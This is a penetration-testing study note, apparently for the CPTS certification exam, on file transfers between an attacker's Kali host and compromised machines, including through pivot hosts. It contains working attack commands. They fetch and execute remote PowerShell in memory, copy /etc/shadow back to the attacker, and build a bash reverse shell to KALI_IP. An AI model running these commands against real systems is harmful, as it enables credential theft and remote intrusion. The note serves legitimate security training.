# 06 — File Transfers

File transfers on the CPTS follow the same techniques as the OSCP, but the multi-subnet enterprise environment adds complexity — you often transfer files through pivots, across firewalled segments, and between compromised hosts that can't reach your Kali directly.

---

## Standard Transfers (Kali ↔ Target)

### Kali → Linux

```bash
# Python HTTP server (start on Kali, download on target)
python3 -m http.server 80
# On target:
wget http://KALI/file
curl http://KALI/file -o file

# SCP (needs SSH access)
scp file user@TARGET:/tmp/

# Netcat (last resort)
# Target: nc -lvnp 9999 > file
# Kali: nc TARGET 9999 < file
```

### Kali → Windows

```bash
# SMB share (best for Windows)
impacket-smbserver share . -smb2support
# On Windows: copy \\KALI\share\file C:\temp\

# certutil
certutil -urlcache -f http://KALI/file C:\temp\file

# PowerShell
iwr http://KALI/file -o C:\temp\file
IEX(New-Object Net.WebClient).DownloadString('http://KALI/script.ps1')
```

### Target → Kali (exfiltration)

```bash
# Linux → Kali
scp user@TARGET:/etc/shadow /tmp/loot/
# Or: nc on Kali, send from target

# Windows → Kali
# Kali: impacket-smbserver share /tmp/loot -smb2support
# Windows: copy C:\file \\KALI\share\
```

---

## Transfers Through Pivots (CPTS-Specific)

### When the target can't reach Kali directly

```
Kali (192.168.244.129)
  │
  ├── Pivot Host (192.168.244.131)  ← can reach both networks
  │
  └── Internal Target (172.16.0.2)  ← can't reach Kali!
```

**Option 1: Upload to pivot, then SCP to internal target**

```bash
# Step 1: Upload to pivot from Kali
scp linpeas.sh user@192.168.244.131:/tmp/

# Step 2: From pivot, upload to internal target
ssh user@192.168.244.131
scp /tmp/linpeas.sh user@172.16.0.2:/tmp/
```

**Option 2: HTTP server on the pivot host**

```bash
# On the pivot host
cd /tmp && python3 -m http.server 8080

# On the internal target
wget http://172.16.0.1:8080/linpeas.sh
```

**Option 3: Port forward through the tunnel**

```bash
# SSH tunnel: make Kali's HTTP server reachable through pivot
ssh -R 8080:127.0.0.1:80 user@192.168.244.131
# Now pivot:8080 → Kali:80

# On the internal target
wget http://172.16.0.1:8080/linpeas.sh
# Traffic: Internal → Pivot:8080 → SSH tunnel → Kali:80
```

**Option 4: Base64 through the shell**

```bash
# On Kali
base64 -w 0 linpeas.sh | xclip -selection clipboard
# Or: base64 -w 0 linpeas.sh (copy the output)

# On the internal target (paste the base64 string)
echo "BASE64_STRING" | base64 -d > linpeas.sh
chmod +x linpeas.sh
```

### Exfiltrating FROM an internal target

```bash
# Option 1: SCP chain
# On internal target → SCP to pivot → SCP to Kali
scp /tmp/loot.txt user@172.16.0.1:/tmp/
# Then from Kali:
scp user@192.168.244.131:/tmp/loot.txt .

# Option 2: Copy through the SMB share
# On Kali: impacket-smbserver share /tmp/loot -smb2support
# SSH tunnel: ssh -L 445:127.0.0.1:445 user@pivot
# On internal Windows target: copy C:\file \\172.16.0.1\share\

# Option 3: Base64 and paste
# On internal target:
base64 -w 0 /etc/shadow
# Copy output → decode on Kali
```

---

## Pre-Staged Tools Directory

Set up your tools directory before the exam:

```bash
mkdir -p ~/tools/{linux,windows,scripts}

# Linux tools
cp /usr/share/peass/linpeas/linpeas.sh ~/tools/linux/
cp /usr/bin/chisel ~/tools/linux/chisel_linux 2>/dev/null
which pspy || wget -O ~/tools/linux/pspy64 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64

# Windows tools
cp /usr/share/peass/winpeas/winPEASx64.exe ~/tools/windows/ 2>/dev/null
cp /usr/share/windows-resources/binaries/nc.exe ~/tools/windows/ 2>/dev/null

# Scripts
echo '#!/bin/bash' > ~/tools/scripts/rev.sh
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> ~/tools/scripts/rev.sh

# Start serving immediately
cd ~/tools && python3 -m http.server 80
```

On the CPTS exam, start this HTTP server at the beginning and leave it running for the entire 10 days.
